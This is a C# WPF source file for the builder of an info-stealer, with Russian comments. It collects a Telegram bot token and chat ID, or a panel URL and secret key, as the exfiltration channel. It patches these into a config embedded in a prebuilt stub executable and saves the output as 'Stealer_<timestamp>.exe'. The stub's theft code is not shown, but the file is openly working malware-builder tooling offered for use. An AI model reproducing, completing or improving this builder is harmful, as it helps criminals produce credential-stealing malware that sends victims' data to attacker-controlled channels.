using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media.Animation;

namespace Builder
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                this.DragMove();
        }

        private void MinimizeButton_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }

        private void TabSend_Click(object sender, RoutedEventArgs e)
        {
            SetActiveTab(TabSend);
            AnimateTabSwitch(SendTab, SettingsTab, BuildTab);
        }

        private void TabSettings_Click(object sender, RoutedEventArgs e)
        {
            SetActiveTab(TabSettings);
            AnimateTabSwitch(SettingsTab, SendTab, BuildTab);
        }

        private void TabBuild_Click(object sender, RoutedEventArgs e)
        {
            SetActiveTab(TabBuild);
            AnimateTabSwitch(BuildTab, SendTab, SettingsTab);
        }

        private void AnimateTabSwitch(Border showTab, Border hideTab1, Border hideTab2)
        {
            // Fade out старые вкладки
            var fadeOut1 = new DoubleAnimation(1, 0, TimeSpan.FromMilliseconds(200));
            var fadeOut2 = new DoubleAnimation(1, 0, TimeSpan.FromMilliseconds(200));
            
            fadeOut1.Completed += (s, e) => hideTab1.Visibility = Visibility.Collapsed;
            fadeOut2.Completed += (s, e) => hideTab2.Visibility = Visibility.Collapsed;
            
            hideTab1.BeginAnimation(UIElement.OpacityProperty, fadeOut1);
            hideTab2.BeginAnimation(UIElement.OpacityProperty, fadeOut2);
            
            // Fade in новую вкладку
            showTab.Visibility = Visibility.Visible;
            var fadeIn = new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(300));
            showTab.BeginAnimation(UIElement.OpacityProperty, fadeIn);
        }

        private void SetActiveTab(Button activeButton)
        {
            // Сбрасываем стили всех вкладок
            TabSend.Style = (Style)FindResource("TabIcon");
            TabSettings.Style = (Style)FindResource("TabIcon");
            TabBuild.Style = (Style)FindResource("TabIcon");

            // Устанавливаем активный стиль
            activeButton.Style = (Style)FindResource("TabIconActive");
        }

        private void RadioTelegram_Checked(object sender, RoutedEventArgs e)
        {
            SwitchDeliveryPanel(TelegramPanel);
        }

        private void RadioPanel_Checked(object sender, RoutedEventArgs e)
        {
            SwitchDeliveryPanel(PanelPanel);
        }

        private void RadioDiscord_Checked(object sender, RoutedEventArgs e)
        {
            SwitchDeliveryPanel(DiscordPanel);
        }

        private void SwitchDeliveryPanel(StackPanel targetPanel)
        {
            if (TelegramPanel == null || PanelPanel == null || DiscordPanel == null) return;

            StackPanel[] allPanels = { TelegramPanel, PanelPanel, DiscordPanel };
            foreach (var panel in allPanels)
            {
                if (panel == targetPanel)
                {
                    panel.Visibility = Visibility.Visible;
                    panel.Opacity = 1;
                }
                else
                {
                    panel.Visibility = Visibility.Collapsed;
                }
            }
        }

        private void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                TxtBuildLog.Text = "";
                AppendLog("[*] Starting build process...");

                // Валидация
                if (RadioTelegram.IsChecked == true)
                {
                    if (string.IsNullOrWhiteSpace(TxtBotToken.Text))
                    {
                        AppendLog("[-] Error: Bot Token is required");
                        MessageBox.Show("Please enter Bot Token", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        return;
                    }
                    if (string.IsNullOrWhiteSpace(TxtChatId.Text))
                    {
                        AppendLog("[-] Error: Chat ID is required");
                        MessageBox.Show("Please enter Chat ID", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        return;
                    }
                }
                else if (RadioPanel.IsChecked == true)
                {
                    if (string.IsNullOrWhiteSpace(TxtPanelUrl.Text))
                    {
                        AppendLog("[-] Error: Panel URL is required");
                        MessageBox.Show("Please enter Panel URL", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                        return;
                    }
                }
                else if (RadioDiscord.IsChecked == true)
                {
                    AppendLog("[-] Discord is not implemented yet");
                    MessageBox.Show("Discord delivery is coming soon", "Info", MessageBoxButton.OK, MessageBoxImage.Information);
                    return;
                }

                AppendLog("[*] Loading stub...");

                // Загружаем стаб из папки Stub
                byte[] stubBytes = LoadStubFromFolder();
                if (stubBytes == null || stubBytes.Length == 0)
                {
                    AppendLog("[-] Error: Failed to load stub");
                    MessageBox.Show("Failed to load stub", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                AppendLog($"[+] Stub loaded: {stubBytes.Length / 1024 / 1024:F2} MB");

                // Загружаем config.json из папки Stub
                AppendLog("[*] Loading config template...");
                string configTemplate = LoadConfigTemplate();
                if (string.IsNullOrEmpty(configTemplate))
                {
                    AppendLog("[-] Error: Failed to load config.json template");
                    MessageBox.Show("Failed to load config.json from Stub folder", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                AppendLog($"[+] Config template loaded: {configTemplate.Length} bytes");

                // Патчим стаб (заменяем токен и чат ID)
                AppendLog("[*] Patching stub with credentials...");
                byte[] patchedStub = PatchStub(stubBytes, configTemplate);

                // Открываем диалог сохранения
                AppendLog("[*] Opening save dialog...");
                var saveDialog = new Microsoft.Win32.SaveFileDialog
                {
                    Title = "Save Built Stealer",
                    Filter = "Executable Files (*.exe)|*.exe|All Files (*.*)|*.*",
                    FileName = $"Stealer_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.exe",
                    DefaultExt = ".exe",
                    InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                };

                if (saveDialog.ShowDialog() != true)
                {
                    AppendLog("[-] Build cancelled by user");
                    return;
                }

                string outputPath = saveDialog.FileName;

                // Сохраняем
                File.WriteAllBytes(outputPath, patchedStub);

                AppendLog($"[+] Build completed successfully!");
                AppendLog($"[+] Output: {outputPath}");
                AppendLog($"[+] Size: {patchedStub.Length / 1024 / 1024:F2} MB");

                MessageBox.Show($"Build completed!\n\nOutput: {outputPath}", "Success", 
                    MessageBoxButton.OK, MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                AppendLog($"[!] Error: {ex.Message}");
                MessageBox.Show($"Build failed: {ex.Message}", "Error", 
                    MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private byte[] LoadStubFromFolder()
        {
            try
            {
                // Получаем путь к папке с билдером
                string exePath = Assembly.GetExecutingAssembly().Location;
                string exeDir = Path.GetDirectoryName(exePath);
                string stubPath = Path.Combine(exeDir, "Stub", "Stub.exe");

                AppendLog($"[DEBUG] Looking for stub at: {stubPath}");

                if (!File.Exists(stubPath))
                {
                    AppendLog($"[-] Stub not found at: {stubPath}");
                    return null;
                }

                return File.ReadAllBytes(stubPath);
            }
            catch (Exception ex)
            {
                AppendLog($"[-] Error loading stub: {ex.Message}");
                return null;
            }
        }

        private string LoadConfigTemplate()
        {
            try
            {
                // Получаем путь к папке с билдером
                string exePath = Assembly.GetExecutingAssembly().Location;
                string exeDir = Path.GetDirectoryName(exePath);
                string configPath = Path.Combine(exeDir, "Stub", "config.json");

                AppendLog($"[DEBUG] Looking for config at: {configPath}");

                if (!File.Exists(configPath))
                {
                    AppendLog($"[-] Config not found at: {configPath}");
                    return null;
                }

                return File.ReadAllText(configPath, Encoding.UTF8);
            }
            catch (Exception ex)
            {
                AppendLog($"[-] Error loading config: {ex.Message}");
                return null;
            }
        }

        private byte[] PatchStub(byte[] stub, string configTemplate)
        {
            // Используем config.json из папки Stub как шаблон
            string oldConfig = configTemplate;
            
            AppendLog($"[DEBUG] Template config length: {oldConfig.Length}");
            AppendLog($"[DEBUG] Template config: {oldConfig}");
            
            // Парсим placeholder'ы из шаблона
            string deliveryPlaceholder = GetPlaceholder(oldConfig, "delivery");
            string tokenPlaceholder = GetPlaceholder(oldConfig, "botToken");
            string chatPlaceholder = GetPlaceholder(oldConfig, "chatId");
            string panelUrlPlaceholder = GetPlaceholder(oldConfig, "panelUrl");
            string secretKeyPlaceholder = GetPlaceholder(oldConfig, "secretKey");
            
            // Build new padded values
            string deliveryValue = RadioPanel.IsChecked == true ? "PANEL" : "TELEGRAM";
            string tokenValue = TxtBotToken.Text ?? "";
            string chatValue = TxtChatId.Text ?? "";
            string panelUrlValue = TxtPanelUrl.Text ?? "";
            string secretKeyValue = TxtSecretKey.Text ?? "";

            string paddedDelivery = PadValue(deliveryValue, deliveryPlaceholder.Length);
            string paddedToken = PadValue(tokenValue, tokenPlaceholder.Length);
            string paddedChatId = PadValue(chatValue, chatPlaceholder.Length);
            string paddedPanelUrl = PadValue(panelUrlValue, panelUrlPlaceholder.Length);
            string paddedSecretKey = PadValue(secretKeyValue, secretKeyPlaceholder.Length);
            
            // Создаём новый конфиг с теми же длинами
            string newConfig = oldConfig.Replace(deliveryPlaceholder, paddedDelivery)
                                        .Replace(tokenPlaceholder, paddedToken)
                                        .Replace(chatPlaceholder, paddedChatId)
                                        .Replace(panelUrlPlaceholder, paddedPanelUrl)
                                        .Replace(secretKeyPlaceholder, paddedSecretKey);
            
            AppendLog($"[DEBUG] New config length: {newConfig.Length}");
            
            if (newConfig.Length != oldConfig.Length)
            {
                AppendLog($"[!] WARNING: Config length mismatch! Old: {oldConfig.Length}, New: {newConfig.Length}");
            }

            byte[] result = new byte[stub.Length];
            Array.Copy(stub, result, stub.Length);

            // Заменяем весь JSON конфиг
            byte[] oldBytes = Encoding.UTF8.GetBytes(oldConfig);
            byte[] newBytes = Encoding.UTF8.GetBytes(newConfig);
            
            AppendLog($"[DEBUG] Old bytes length: {oldBytes.Length}");
            AppendLog($"[DEBUG] New bytes length: {newBytes.Length}");
            
            int replacedCount = ReplaceBytes(result, oldBytes, newBytes);
            
            if (replacedCount > 0)
            {
                AppendLog($"[+] Successfully patched {replacedCount} occurrence(s)");
            }
            else
            {
                AppendLog($"[-] WARNING: Config pattern not found in stub!");
                AppendLog($"[DEBUG] This means the stub was not built with the embedded config.json");
            }

            return result;
        }

        private string GetPlaceholder(string config, string key)
        {
            int start = config.IndexOf($"\"{key}\":\"") + key.Length + 4;
            int end = config.IndexOf("\"", start);
            return config.Substring(start, end - start);
        }

        private string PadValue(string val, int length)
        {
            return val.Length > length ? val.Substring(0, length) : val.PadRight(length, ' ');
        }

        private int ReplaceBytes(byte[] source, byte[] search, byte[] replace)
        {
            int replacedCount = 0;
            
            // Длины должны совпадать для in-place замены
            if (replace.Length != search.Length)
            {
                return 0;
            }

            // Ищем и заменяем все вхождения
            for (int i = 0; i <= source.Length - search.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < search.Length; j++)
                {
                    if (source[i + j] != search[j])
                    {
                        found = false;
                        break;
                    }
                }

                if (found)
                {
                    Array.Copy(replace, 0, source, i, replace.Length);
                    replacedCount++;
                    i += search.Length - 1; // Skip replaced bytes
                }
            }

            return replacedCount;
        }

        private void AppendLog(string message)
        {
            TxtBuildLog.Text += message + "\n";
        }
    }
}
